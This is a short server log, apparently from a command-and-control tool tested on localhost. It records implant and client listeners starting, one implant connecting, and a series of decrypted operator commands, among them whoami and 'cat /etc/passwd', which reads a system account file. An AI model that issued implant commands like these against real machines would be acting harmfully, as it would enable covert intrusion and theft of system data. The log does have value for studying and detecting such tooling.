2023/11/28 11:41:30 Starting the application
2023/11/28 11:41:30 Starting implant listener on port 8008...
2023/11/28 11:41:30 Starting remote client listener on port 8009...
2023/11/28 11:42:03 Received command: /cqVBqeH2w/fUA50takvM4WBhJlkIBwvhEaOWCSdY9Y=
2023/11/28 11:42:03 Decrypted command received: list
2023/11/28 11:42:03 No implants connected.
2023/11/28 11:42:03 Received command: pOvw9Bj0wdRLrYKp8uhfGZCKd9vmbm7T/rUsMgeNgQw=
2023/11/28 11:42:03 Decrypted command received: pwd
2023/11/28 11:42:03 Received command: 4SWn4DjFf/ygWcQusNwItewSjaDVKx31sTGheA8ieZEkcGSx
2023/11/28 11:42:03 Decrypted command received: current
2023/11/28 11:42:56 New implant connected: 1, Hostname: localhost, IP: 127.0.0.1
2023/11/28 11:43:00 Received command: B+eKd4EeWkVnUF4B0dmkIu14ezvv3aRJ3/CrUJfldY4=
2023/11/28 11:43:00 Decrypted command received: list
2023/11/28 11:43:00 Connected implants:
2023/11/28 11:43:00  - Implant ID: 1, Hostname: localhost, IP: 127.0.0.1
2023/11/28 11:43:00  - Implant ID: 1, Hostname: localhost, IP: 127.0.0.1
2023/11/28 11:43:00 Received command: SITH3b2JiwT2L8DuFsKEdP0PYk8qug3RrIMY6S8TW0s=
2023/11/28 11:43:00 Decrypted command received: pwd
2023/11/28 11:43:00 Received command: ixwbmsGkMWnjZPF6/6laeDvns+M99m259pY3sAMD42UE9mdc
2023/11/28 11:43:00 Decrypted command received: current
2023/11/28 11:43:02 Received command: gXRpkKagfsR8p/mDiza+6/tGr/P0nyvQoscQPKvpAnyOWAx/
2023/11/28 11:43:02 Decrypted command received: select 1
2023/11/28 11:43:02 Selected implant 1
2023/11/28 11:43:02 Received command: jDtaCZilh0hlqW7jQhVmIGso6Tt6Z5EGBD0n/uMr1P0=
2023/11/28 11:43:02 Decrypted command received: pwd
2023/11/28 11:43:02 Received command: IDW0Qg5minlbEpxJe+4ZPh5mJ0P1MLaULvHw+QDrDfn/htIC
2023/11/28 11:43:02 Decrypted command received: current
2023/11/28 11:43:04 Received command: rCj2GOJcOhxRGmTNiSSngUu5gAgPV5WFX12nYSI/wIME0A==
2023/11/28 11:43:04 Decrypted command received: whoami
2023/11/28 11:43:04 Received command: PSasXNYOjMh2iMnttUDOXsXbneesMG0yDQfrGns+ewo=
2023/11/28 11:43:04 Decrypted command received: pwd
2023/11/28 11:43:04 Received command: NH705l8RwjiYk+dHykwwFAroo1YVM/0rEe5ikSj0EuzB5ztg
2023/11/28 11:43:04 Decrypted command received: current
2023/11/28 11:43:07 Received command: 2CRW6Kb/Wze5AJGxt18VPStN8g65v3trM62Bm7gVsxRQivb6K7X0KNivxw==
2023/11/28 11:43:07 Decrypted command received: cat /etc/passwd
2023/11/28 11:43:07 Received command: bMPvAVilawTtdcZ+cjUziwfeZmuMjDjLIpkamssg5dQ=
2023/11/28 11:43:07 Decrypted command received: pwd
2023/11/28 11:43:07 Received command: LyaYBICLCC7syLiCboQ7R02jfm2dQhMO3IheM0SxfKoVL19L
2023/11/28 11:43:07 Decrypted command received: current
